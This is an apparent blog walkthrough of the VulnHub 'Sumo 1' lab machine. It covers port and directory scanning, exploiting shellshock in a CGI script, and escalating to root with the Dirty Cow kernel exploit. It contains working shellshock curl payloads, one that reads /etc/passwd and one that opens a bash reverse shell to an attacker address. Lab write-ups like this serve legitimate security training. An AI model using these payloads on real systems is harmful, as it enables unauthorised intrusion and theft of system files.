<!-- wp:paragraph -->
<p><a href="https://www.vulnhub.com/entry/sumo-1,480/" target="_blank" rel="noreferrer noopener">https://www.vulnhub.com/entry/sumo-1,480/</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-purple","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-purple-background-color has-background has-small-font-size">Review</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Enumeration indicates the possibility of a shellshock exploit</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Scan and test for shellshock vulnerability</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use shellshock to get a reverse shell</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Linux enumeration indicates the kernel is outdated</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use known outdated Linux exploit like Dirty Cow to gain privilege access</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"luminous-vivid-amber","fontSize":"small"} -->
<p class="has-text-align-center has-luminous-vivid-amber-background-color has-background has-small-font-size"><strong>Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4098,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-47.png?w=869" alt="" class="wp-image-4098"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 80</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4099,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-48.png?w=714" alt="" class="wp-image-4099"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run a gobuster scan to find for hidden directories. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4101,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-49.png?w=1024" alt="" class="wp-image-4101"/><figcaption class="wp-element-caption">/cgi-bin/ has 403 status. Run another scan on it.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4105,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-51.png?w=669" alt="" class="wp-image-4105"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4103,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-50.png?w=697" alt="" class="wp-image-4103"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/cgi-bin/ has be known to have shellshock vulnerability , use a nmap script to check if this vulnerability is available on the test script.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4108,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-53.png?w=916" alt="" class="wp-image-4108"/><figcaption class="wp-element-caption">Vulnerability found.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's test using the shellshock script.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.18.12:80/cgi-bin/test.sh</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4109,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-54.png?w=1024" alt="" class="wp-image-4109"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Inject a reverse shell via the shell shock script.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.18.2/1234 0&gt;&amp;1'" http://192.168.18.12/cgi-bin/test.sh</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4111,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-55.png?w=1024" alt="" class="wp-image-4111"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-cyan-blue","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-cyan-blue-background-color has-background has-small-font-size"><strong>Foothold</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>User access gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4113,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-56.png?w=675" alt="" class="wp-image-4113"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Upload linpeas to find for some clues.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4114,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-57.png?w=600" alt="" class="wp-image-4114"/><figcaption class="wp-element-caption">The linux kernel is outdated</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Check online for the kernel exploit and we can use the dirty cow exploit.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4118,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-59.png?w=1024" alt="" class="wp-image-4118"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4125,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-63.png?w=660" alt="" class="wp-image-4125"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Upload the exploit to the victim machine.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4119,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-60.png?w=825" alt="" class="wp-image-4119"/><figcaption class="wp-element-caption">Got an error compiling the code.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Google indicates to change the path directory.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4121,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-61.png?w=1024" alt="" class="wp-image-4121"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"black","textColor":"white","fontSize":"small"} -->
<p class="has-text-align-center has-white-color has-black-background-color has-text-color has-background has-small-font-size"><strong>Privilege escalation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>New account created</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4123,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-62.png?w=823" alt="" class="wp-image-4123"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Switch to the new user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4126,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-64.png?w=479" alt="" class="wp-image-4126"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Root flag is found.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4128,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-65.png?w=368" alt="" class="wp-image-4128"/></figure>
<!-- /wp:image -->
